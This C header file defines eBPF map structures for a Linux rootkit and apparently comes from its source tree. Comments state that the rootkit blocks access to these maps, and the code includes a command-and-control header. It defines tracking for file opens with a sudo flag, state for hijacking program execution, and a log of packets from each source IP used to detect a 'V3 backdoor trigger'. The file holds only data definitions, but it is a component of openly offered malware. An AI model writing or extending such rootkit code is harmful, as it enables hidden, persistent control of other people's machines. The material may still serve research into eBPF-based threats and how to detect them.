#ifndef __BPF_MAP_DEFS_H
#define __BPF_MAP_DEFS_H

#include "headervmlinux.h"
#include "../../../common/c&c.h"

//Tasks and comms
#define TASK_COMM_LEN 16


/*PRIVATE MAPS*/
//Any attempt to access these maps will be blocked by the rookit

//File system data of a running program which opened some fd
#define FS_OPEN_DATA_PROGRAM_NAME_SIZE 16
#define FS_OPEN_DATA_FILENAME_SIZE 16

//Execution hijacking
#define EXEC_VAR_HIJACK_ACTIVE_DATA_ARGV0_LEN 64

struct fs_open_data{ //Map value
	char* buf;
	int fd;
	__u32 pid;
	char program_name[FS_OPEN_DATA_PROGRAM_NAME_SIZE];
	char filename[FS_OPEN_DATA_FILENAME_SIZE];
	int is_sudo;
};

struct exec_var_hijack_active_data{//Map value
	__u32 pid;
	int hijack_state;
	char argv0[EXEC_VAR_HIJACK_ACTIVE_DATA_ARGV0_LEN];
};

//Map value, contains 3 last packets from an specific IP (the key)
struct backdoor_packet_log_data{
	int last_packet_modified;
	struct trigger_t trigger_array[3];
};


struct fs_priv_open{ //Map
	__uint(type, BPF_MAP_TYPE_HASH);
	__uint(max_entries, 4096);
	__type(key, __u64); //thread group id(MSB) + pid (LSB)
	__type(value, struct fs_open_data);
} fs_open SEC(".maps");

struct exec_var_priv_hijack_active{ //Map
	__uint(type, BPF_MAP_TYPE_HASH);
	__uint(max_entries, 1);
	__type(key, __u64);
	__type(value, struct exec_var_hijack_active_data);
} exec_var_hijack_active SEC(".maps");

//Map to store log of packets received seeking to find a V3 backdoor trigger
struct backdoor_priv_packet_log{ 
	__uint(type, BPF_MAP_TYPE_HASH);
	__uint(max_entries, 1024);
	__type(key, __u32); //Source IPv4 of packet
	__type(value, struct backdoor_packet_log_data);
} backdoor_packet_log SEC(".maps");


/*PROTECTED MAPS*/
//Any attempt to access these maps will be blocked by the rootkit if the program is not whitelisted
//Located at /src/map_prot.h

#endif